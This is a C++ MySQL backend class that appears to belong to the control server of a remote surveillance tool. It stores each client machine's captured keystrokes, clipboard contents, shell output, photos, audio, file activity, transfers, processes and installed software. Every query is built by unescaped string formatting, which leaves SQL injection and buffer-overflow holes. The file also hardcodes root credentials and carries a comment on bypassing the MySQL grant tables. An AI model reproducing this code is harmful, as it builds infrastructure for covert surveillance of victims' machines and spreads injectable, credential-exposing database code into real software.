#include "mysqlOper.h"
#include "Public.h"

#include <string>

using namespace std;

#ifdef USE_MYSQL

#pragma comment(lib,"libmysql.lib")

#define DEFAULT_MYSQL_CHAR_SET "utf8mb4"
#define DATABASE_NAME "computer"
#define HOSTNAME "localhost"
#define MYSQL_PORT 3306
#ifdef _DEBUG 
#define USERNAME "root"
#define PASSWORD "123456"
#else
#define USERNAME "root"
#define PASSWORD "root"
#endif

CRITICAL_SECTION gstCriticalSection = { 0 };

void MySql::initLock() {
	InitializeCriticalSection(&gstCriticalSection);
}

void MySql::enterLock() {
	EnterCriticalSection(&gstCriticalSection);
}

void MySql::leaveLock() {
	LeaveCriticalSection(&gstCriticalSection);
}



MySql::MySql() :errorNum(0), errorInfo("ok")
{
	char szout[1024];
	bool ret = false;

	mysql_init(&mysqlInstance);
	//mysql_library_init(0, NULL, NULL);
	mysql_options(&mysqlInstance, MYSQL_SET_CHARSET_NAME, DEFAULT_MYSQL_CHAR_SET);

	ret = connectMySQL(HOSTNAME, USERNAME, PASSWORD, DATABASE_NAME, MYSQL_PORT);
	if (ret == false)
	{
		errorIntoMySQL();
		wsprintfA(szout, "mysql connect error:%u,info:%s\r\n", errorNum, errorInfo);
		WriteLog(szout);
		return;
	}

	ret = useDatabase(DATABASE_NAME);
	if (ret == false)
	{
		errorIntoMySQL();
		wsprintfA(szout, "mysql use error:%u,info:%s\r\n", errorNum, errorInfo);
		WriteLog(szout);
		return;
	}

	return;
}


string MySql::getIdFromPhoto(string path) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from pc_photo where path='%s'", path.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		errorIntoMySQL();
		wsprintfA(szout, "getIdFromUserName error:%s,error:%u,desc:%s\r\n", path.c_str(), errorNum, errorInfo);
		WriteLog(szout);
		return "";
	}
}


int MySql::insertPhoto(string mac, string type, string filepath) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		wsprintfA(cmd, "insertPhoto getIdFromClient:%s error\r\n", mac.c_str());
		WriteLog(cmd);
		return false;
	}

	string strtm = getformatdt();
	replaceSlash(filepath);

	string id = getIdFromPhoto(filepath);
	if (id != "")
	{
		return true;
	}

	int len = wsprintfA(cmd, "INSERT INTO pc_photo (type,path,time,client_id) VALUES ('%s', '%s', '%s', '%s')",
		type.c_str(), filepath.c_str(), strtm.c_str(), clientid.c_str());
	if (0 == mysql_query(&mysqlInstance, cmd)) {
		return true;
	}

	WriteLog(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertPhoto error,errorno:%u,errorinfo:%s,filepath:%s,mac:%s\r\n",
		errorNum, errorInfo, filepath.c_str(), mac.c_str());
	WriteLog(cmd);

	return false;
}


int MySql::insertAudio(string mac, string filepath, int filesize) {
	string clientid = getIDFromClient(mac);
	if (clientid != "")
	{
		char cmd[1024];
		string strtm = getformatdt();
		replaceSlash(filepath);

		int len = wsprintfA(cmd, "INSERT INTO pc_audio(client_id,size,path,time) VALUES (%s, '%u', '%s', '%s')",
			clientid.c_str(), filesize, filepath.c_str(), strtm.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
		else {
			WriteLog("insertAudio error\r\n");
			errorIntoMySQL();
			return false;
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "insertAudio getIdFromClient:%s error\r\n", mac.c_str());
		WriteLog(szout);

		errorIntoMySQL();
		return false;
	}
}

int MySql::insertClient(string username, string mac, string info) {
	char cmd[0x4000];



	string id = getIDFromClient(mac);

	string strtm = getformatdt();

	if (id == "")
	{
		string userid = getIdFromUser(username);

		int len = sprintf(cmd, "INSERT INTO pc_client (user_id,mac,name,info,ts,state) VALUES (%s, '%s','%s','%s' ,'%s', 0)",
			userid.c_str(), mac.c_str(), mac.c_str(), info.c_str(), strtm.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		// 		int len = sprintf(cmd, "UPDATE pc_client SET id=%s, user_id = %s,mac = '%s',name='%s',info='%s',ts = '%s',state = 1 WHERE id=%s",
		// 			id.c_str(),userid.c_str(), mac.c_str(),mac.c_str(), info.c_str(), strtm.c_str(), id.c_str());
		int len = sprintf(cmd, "UPDATE pc_client SET id=%s, mac = '%s',info='%s',ts = '%s',state = 0 WHERE id=%s",
			id.c_str(), mac.c_str(), info.c_str(), strtm.c_str(), id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	WriteLog(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertClient error,errorno:%u,errorinfo:%s,username:%s,mac:%s\r\n", errorNum, errorInfo, username.c_str(), mac.c_str());
	WriteLog(cmd);

	return false;
}


int MySql::insertClientFromCmd(string username, string mac) {
	char cmd[1024];

	string clientid = getIDFromClient(mac);



	if (clientid == "")
	{
		string userid = getIdFromUser(username);

		string strtm = getformatdt();
		int len = wsprintfA(cmd, "INSERT INTO pc_client (user_id,mac,name,ts,state) VALUES (%s, '%s','%s','%s',0)",
			userid.c_str(), mac.c_str(), mac.c_str(), strtm.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		string strtm = getformatdt();
		int len = wsprintfA(cmd, "UPDATE pc_client SET id=%s, mac = '%s',ts = '%s' WHERE id=%s",
			clientid.c_str(), mac.c_str(), strtm.c_str(), clientid.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	WriteLog(cmd);

	errorIntoMySQL();
	wsprintfA(cmd, "insertClientFromCmd error,errorno:%u,errorinfo:%s,username:%s,mac:%s\r\n",
		errorNum, errorInfo, username.c_str(), mac.c_str());
	WriteLog(cmd);

	return false;
}


string MySql::getProcessID(string clientid, string processes, string pid) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from pc_process where client_id=%s and process_name='%s'", clientid.c_str(), processes.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getProcessID error:%s\r\n", clientid.c_str());
		WriteLog(szout);

		return "";
	}
}

int MySql::insertProcesses(string mac, string processes, string pid) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		return false;
	}

	string id = getProcessID(clientid, processes, pid);
	if (id == "")
	{
		int len = wsprintfA(cmd, "INSERT INTO pc_process (client_id,process_id,process_name) VALUES ( %s, %s, '%s')",
			clientid.c_str(), pid.c_str(), processes.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		//replace语句不能根据where子句来定位要被替换的记录
		int len = wsprintfA(cmd, "UPDATE pc_process SET id=%s, client_id = %s,process_id = %s,process_name='%s' WHERE id = %s ",
			id.c_str(), clientid.c_str(), pid.c_str(), processes.c_str(), id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}


	WriteLog(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertProcesses error,errorno:%u,errorinfo:%s,mac:%s\r\n", errorNum, errorInfo, mac.c_str());
	WriteLog(cmd);

	return false;
}

int MySql::insertShells(string mac, string data) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		return false;
	}

	string strtm = getformatdt();

	int len = wsprintfA(cmd, "INSERT INTO pc_shell (client_id,content,time) VALUES ( %s, '%s','%s')",
		clientid.c_str(), data.c_str(), strtm.c_str());
	if (0 == mysql_query(&mysqlInstance, cmd)) {
		return true;
	}

	wsprintfA(cmd, "insertShells:%s error\r\n", mac.c_str());
	WriteLog(cmd);
	return false;
}


int MySql::insertClipboard(string mac, string data) {
	char cmd[0x10000];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		return false;
	}

	int len = sprintf(cmd, "INSERT INTO pc_clipboard (client_id,content) VALUES ( %s, '%s')", clientid.c_str(), data.c_str());
	if (0 == mysql_query(&mysqlInstance, cmd)) {
		return true;
	}

	wsprintfA(cmd, "insertClipboard getIdFromClient:%s error\r\n", mac.c_str());
	WriteLog(cmd);
	return false;
}

int MySql::insertKeyboard(string mac, string data) {
	char cmd[0x1000];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		return false;
	}

	int len = sprintf(cmd, "INSERT INTO pc_keyboard (client_id,content) VALUES ( %s, '%s')", clientid.c_str(), data.c_str());
	if (0 == mysql_query(&mysqlInstance, cmd)) {
		return true;
	}

	wsprintfA(cmd, "insertKeyboard getIdFromClient:%s error\r\n", mac.c_str());
	WriteLog(cmd);
	return false;
}


int MySql::insertUploadFile(string mac, string data) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		return false;
	}

	int len = wsprintfA(cmd, "INSERT INTO pc_uploadfile (client_id,file_path) VALUES ( %s, '%s')", clientid.c_str(), data.c_str());
	if (0 == mysql_query(&mysqlInstance, cmd)) {
		return true;
	}

	wsprintfA(cmd, "insertUploadFile:%s error,client:%s\r\n", data.c_str(), mac.c_str());
	WriteLog(cmd);
	return false;
}

int MySql::insertDownloadFile(string mac, string data) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		return false;
	}

	int len = wsprintfA(cmd, "INSERT INTO pc_downloadfile (client_id,file_path) VALUES ( %s, '%s')", clientid.c_str(), data.c_str());
	if (0 == mysql_query(&mysqlInstance, cmd)) {
		return true;
	}

	wsprintfA(cmd, "insertDownloadFile:%s error,client:%s\r\n", data.c_str(), mac.c_str());
	WriteLog(cmd);
	return false;
}


int MySql::insertFilesOper(string mac, string fullname) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		return false;
	}

	replaceSlashAndEnterAndQuot(fullname);

	int len = wsprintfA(cmd, "INSERT INTO pc_filemonitor (client_id,content) VALUES ( %s, '%s')", clientid.c_str(), fullname.c_str());
	if (0 == mysql_query(&mysqlInstance, cmd)) {
		return true;
	}

	WriteLog(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertFilesOper error,errorno:%u,errorinfo:%s,mac:%s\r\n",
		errorNum, errorInfo, mac.c_str());
	WriteLog(cmd);

	return false;
}

string MySql::getIdFromFiles(string clientid, string fullname) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from pc_file where client_id=%s and file_path='%s'", clientid.c_str(), fullname.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getIdFromFiles error:%s\r\n", clientid.c_str());
		WriteLog(szout);
		return "";
	}
}

bool MySql::insertFiles(string mac, string fullname) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		return false;
	}

	replaceSlashAndEnterAndQuot(fullname);

	string id = getIdFromFiles(clientid, fullname);
	if (id == "")
	{
		int len = wsprintfA(cmd, "INSERT INTO pc_file (client_id,file_path) VALUES ( %s, '%s')", clientid.c_str(), fullname.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		//replace语句不能根据where子句来定位要被替换的记录
		int len = wsprintfA(cmd, "UPDATE pc_file SET id=%s, client_id = %s,file_path = '%s' WHERE id = %s ",
			id.c_str(), clientid.c_str(), fullname.c_str(), id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	WriteLog(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertFiles error,errorno:%u,errorinfo:%s,mac:%s\r\n", errorNum, errorInfo, mac.c_str());
	WriteLog(cmd);

	return false;
}

string MySql::getInstallAppsID(string clientid, string softname) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from pc_install where client_id=%s and soft_name='%s'", clientid.c_str(), softname.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getInstallAppsID error:%s\r\n", clientid.c_str());
		WriteLog(szout);

		return "";
	}
}


int MySql::insertInstallApps(string mac, string name, string ver, string path, string pub, string unpath, string date) {
	char cmd[1024];
	string clientid = getIDFromClient(mac);
	if (clientid == "")
	{
		wsprintfA(cmd, "insertInstallApps getIdFromClient:%s error\r\n", mac.c_str());
		WriteLog(cmd);
		return false;
	}

	string id = getInstallAppsID(clientid, name);
	if (id == "")
	{
		int len = sprintf(cmd, "INSERT INTO pc_install (client_id,soft_name,version,install_path,publisher,uninstall_path,time) VALUES ( %s,'%s','%s','%s','%s','%s','%s')",
			clientid.c_str(), name.c_str(), ver.c_str(), path.c_str(), pub.c_str(), unpath.c_str(), date.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}
	else {
		int len = sprintf(cmd, "UPDATE pc_install SET id=%s,client_id=%s,soft_name='%s',version='%s',install_path='%s',publisher='%s',uninstall_path='%s',time='%s' WHERE id=%s",
			id.c_str(), clientid.c_str(), name.c_str(), ver.c_str(), path.c_str(), pub.c_str(), unpath.c_str(), date.c_str(), id.c_str());
		if (0 == mysql_query(&mysqlInstance, cmd)) {
			return true;
		}
	}

	WriteLog(cmd);
	errorIntoMySQL();
	wsprintfA(cmd, "insertInstallApps error,errorno:%u,errorinfo:%s,mac:%s\r\n",
		errorNum, errorInfo, mac.c_str());
	WriteLog(cmd);

	return false;
}




string MySql::getIDFromClient(string mac) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from pc_client where mac='%s'", mac.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		wsprintfA(szout, "getIdFromClient error:%s\r\n", mac.c_str());
		WriteLog(szout);
		return "";
	}
}



// string MySql::getUIDFromClient(string mac) {
// 	char szcmd[1024];
// 	wsprintfA(szcmd, "select user_id from pc_client where mac='%s'", mac.c_str());
// 	vector<vector<string>> data;
// 	bool ret = getDatafromDB(szcmd, data);
// 	if (ret)
// 	{
// 		if (data.size() <= 0)
// 		{
// 			return "";
// 		}
// 		else if(data.at(0).size() <= 0){
// 			return "";
// 		}
// 		else {
// 			return data.at(0).at(0);
// 		}
// 	}
// 	else {
// 		char szout[1024];
// 		wsprintfA(szout, "getIdFromClient error:%s\r\n", mac.c_str());
// 		WriteLog(szout);
// 		return "";
// 	}
// }



string MySql::getIdFromUser(string username) {
	char szcmd[1024];
	wsprintfA(szcmd, "select id from pc_user where user='%s'", username.c_str());
	vector<vector<string>> data;
	bool ret = getDatafromDB(szcmd, data);
	if (ret)
	{
		if (data.size() <= 0)
		{
			return "";
		}
		else if (data.at(0).size() <= 0) {
			return "";
		}
		else {
			return data.at(0).at(0);
		}
	}
	else {
		char szout[1024];
		errorIntoMySQL();
		wsprintfA(szout, "getIdFromUserName error:%s,error:%u,desc:%s\r\n", username.c_str(), errorNum, errorInfo);
		WriteLog(szout);
		return "";
	}
}


bool MySql::connectMySQL(char* server, char* username, char* password, char* database, int port)
{
	if (mysql_real_connect(&mysqlInstance, server, username, password, database, port, 0, 0) != NULL) {
		return true;
	}
	else {
		char szout[1024];
		errorIntoMySQL();
		wsprintfA(szout, "connectMySQL error no:%u,desc:%s\r\n", errorNum, errorInfo);
		WriteLog(szout);
	}

	return false;
}



bool MySql::useDatabase(std::string dbname)
{
	string queryStr = "use ";
	queryStr += dbname;
	if (0 == mysql_query(&mysqlInstance, queryStr.c_str()))
	{
		return true;
	}
	else {
		errorIntoMySQL();
		char szout[1024];
		wsprintfA(szout, "use database error no:%u,desc:%s\r\n", errorNum, errorInfo);
		WriteLog(szout);
		return false;
	}
}


bool MySql::createDatabase(std::string dbname)
{
	std::string queryStr = "create database if not exists ";
	queryStr += dbname + "";
	if (0 == mysql_query(&mysqlInstance, queryStr.c_str()))
	{
		queryStr = "use ";
		queryStr += dbname;
		if (0 == mysql_query(&mysqlInstance, queryStr.c_str()))
		{
			return true;
		}

	}

	return false;
}



bool MySql::createdbTable(const std::string& query)
{
	if (0 == mysql_query(&mysqlInstance, query.c_str()))
	{
		return true;
	}

	return false;
}






bool MySql::getDatafromDB(string queryStr, std::vector<std::vector<std::string> >& data)
{

	if (0 != mysql_query(&mysqlInstance, queryStr.c_str()))
	{
		char szout[1024];
		errorIntoMySQL();
		wsprintfA(szout, "getDatafromDB error no:%u,desc:%s\r\n", errorNum, errorInfo);
		WriteLog(szout);
		return false;
	}

	MYSQL_RES* result = mysql_store_result(&mysqlInstance);
	if (result <= 0)
	{
		//mysql_free_result(result);

		char szout[1024];
		errorIntoMySQL();
		wsprintfA(szout, "mysql_store_result error no:%u,desc:%s\r\n", errorNum, errorInfo);
		WriteLog(szout);
		return false;
	}

	unsigned long long row = mysql_num_rows(result);
	int field = mysql_num_fields(result);

	MYSQL_ROW line = NULL;
	line = mysql_fetch_row(result);

	int j = 0;
	std::string temp = "";
	while (NULL != line)
	{
		std::vector<std::string> linedata;
		for (int i = 0; i < field; i++)
		{
			if (line[i])
			{
				temp = line[i];
				linedata.push_back(temp);
			}
			else
			{
				temp = "";
				linedata.push_back(temp);
			}
		}
		line = mysql_fetch_row(result);
		data.push_back(linedata);
	}

	mysql_free_result(result);
	return true;
}

void MySql::errorIntoMySQL()
{
	errorNum = mysql_errno(&mysqlInstance);
	errorInfo = mysql_error(&mysqlInstance);
}


void MySql::closeMySQL()
{
	mysql_close(&mysqlInstance);
}


MySql::~MySql()
{
	closeMySQL();

	mysql_library_end();
}


//setup mysql
//mysqld --install
//mysqld --initialize --user=root --console
//net start mysql

//net stop mysql
//skip-grant-tables
//net start mysql
//mysql
// use mysql;
//update user set password=password("520") where user="root";
//flush privileges;


bool MySql::init() {
	int value = 1;
	mysql_options(&mysqlInstance, MYSQL_OPT_RECONNECT, (char*)&value);

	string cmd = "set global max_allowed_packet=1024*1024*1024";
	if (mysql_query(&mysqlInstance, cmd.c_str())) {
		return false;
	}

	cmd = "set interactive_timeout=30*24*3600";
	if (mysql_query(&mysqlInstance, cmd.c_str())) {
		return false;
	}

	cmd = "set global wait_timeout=30*24*3600 ";
	if (mysql_query(&mysqlInstance, cmd.c_str())) {
		return false;
	}

	return true;
}

#endif